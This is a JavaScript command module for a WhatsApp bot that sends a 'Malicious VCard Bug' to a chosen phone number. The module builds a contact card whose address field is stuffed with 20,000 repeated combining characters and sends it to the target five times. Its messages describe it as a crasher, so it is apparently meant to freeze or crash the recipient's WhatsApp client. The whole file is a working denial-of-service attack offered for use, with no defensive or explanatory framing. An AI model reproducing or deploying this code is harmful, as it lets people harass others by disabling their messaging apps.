module.exports = async function(sock, from, msg, isOwner, q) {
    if (!isOwner) return await sock.sendMessage(from, { text: '❌ Owner only!' }, { quoted: msg });
    
    try {
        let target;
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;
        
        if (q) target = q.replace(/\D/g, '') + '@s.whatsapp.net';
        else if (mentioned) target = mentioned;
        else if (quoted) target = quoted;
        else target = from;

        await sock.sendMessage(from, { text: `📇 *Sending Malicious VCard Bug to:* ${target.split('@')[0]}` }, { quoted: msg });

        const vcard = 'BEGIN:VCARD\n' +
                    'VERSION:3.0\n' +
                    'FN:BALI GIL CRASHER\n' +
                    'TEL;type=CELL;type=VOICE;waid=99999999999:+999 999 999 999\n' +
                    'item1.ADR:;;' + "҈".repeat(20000) + ';;;;\n' +
                    'item1.X-ABLabel:.\n' +
                    'END:VCARD';

        for (let i = 0; i < 5; i++) {
            try {
                await sock.sendMessage(target, { 
                    contacts: { 
                        displayName: 'BALI GIL BUG', 
                        contacts: [{ vcard }] 
                    } 
                });
            } catch (e) {}
        }

        await sock.sendMessage(from, { text: '✅ *VCard Bug Sent!*' }, { quoted: msg });
    } catch (e) {
        await sock.sendMessage(from, { text: '❌ Error: ' + e.message }, { quoted: msg });
    }
};
